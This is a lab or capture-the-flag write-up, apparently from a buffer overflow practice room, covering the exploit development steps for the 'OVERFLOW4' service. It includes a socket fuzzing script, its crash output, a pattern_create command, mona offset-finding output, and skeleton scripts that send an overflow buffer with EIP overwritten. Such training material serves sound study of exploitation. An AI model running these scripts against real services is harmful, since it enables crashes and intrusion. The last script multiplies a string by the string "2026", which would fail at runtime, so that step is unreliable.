# OVERFLOW4

## Fuzz

The first thing I need to do is determine how many bytes are required to crash the application, I can "fuzz" the application with the following python script:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.188.25"

port = 1337
timeout = 5
prefix = "OVERFLOW4 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```


This crashes the app at 2100 bytes

```
└─$ ./fuzz.py          
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Fuzzing with 2100 bytes
Fuzzing crashed at 2100 bytes                                   
```

# Finding offset

With this I can create a non-repeating pattern with this length using metasploit

```
└─$ /usr/bin/msf-pattern_create -l 2100    

```
I can then add this the following skeleton script's payload:

```python
#!/usr/bin/env python3
import socket

ip = "10.10.188.25"
port = 1337

prefix = "OVERFLOW4 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```

Then after sending the pattern i can use !mona findmsp -distance 2100

```
0BADF  [+] Command used:
0BADF  !mona findmsp -distance 2100
0BADF  [+] Looking for cyclic pattern in memory
74B20  Modules C:\Windows\System32\wshtcpip.dll
0BADF      Cyclic pattern (normal) found at 0x0186f242 (length 2100 bytes)
0BADF      Cyclic pattern (normal) found at 0x004e3952 (length 2100 bytes)
0BADF      Cyclic pattern (normal) found at 0x004e4d82 (length 2100 bytes)
0BADF  [+] Examining registers
0BADF      EIP contains normal pattern : 0x70433570 (offset 2026)
0BADF      ESP (0x0186fa30) points at offset 2030 in normal pattern (length 70)
0BADF      EBP contains normal pattern : 0x43347043 (offset 2022)
0BADF      EBX contains normal pattern : 0x33704332 (offset 2018)
0BADF  [+] Examining SEH chain
0BADF  [+] Examining stack (+- 2100 bytes) - looking for cyclic pattern
0BADF      Walking stack from 0x0186f1fc to 0x01870268 (0x0000106c bytes)
0BADF      0x0186f244 : Contains normal cyclic pattern at ESP-0x7ec (-2028) : offset 2, length 2098 (-> 0x0186fa75 : ESP+0x46)
0BADF  [+] Examining stack (+- 2100 bytes) - looking for pointers to cyclic pattern
0BADF      Walking stack from 0x0186f1fc to 0x01870268 (0x0000106c bytes)
0BADF      0x0186fafc : Pointer into normal cyclic pattern at ESP+0xcc (+204) : 0x0186fa44 : offset 2050, length 50
0BADF  [+] Preparing output file 'findmsp.txt'
0BADF      - (Re)setting logfile c:\mona\oscp\findmsp.txt
0BADF  [+] Generating module info table, hang on...
0BADF      - Processing modules
0BADF      - Done. Let's rock 'n roll.
0BADF
0BADF  [+] This mona.py action took 0:00:06.848000

```
# Replicate to find EIP and ESP

replicate crash and verify I can put 4 B's in EIP and my shellcode's worth of C's into ESP


```
#!/usr/bin/env python3
import socket

ip = "10.10.188.25"
port = 1337

prefix = "OVERFLOW4 "
offset = "2026"
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "C" * (2100-2026-4)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```


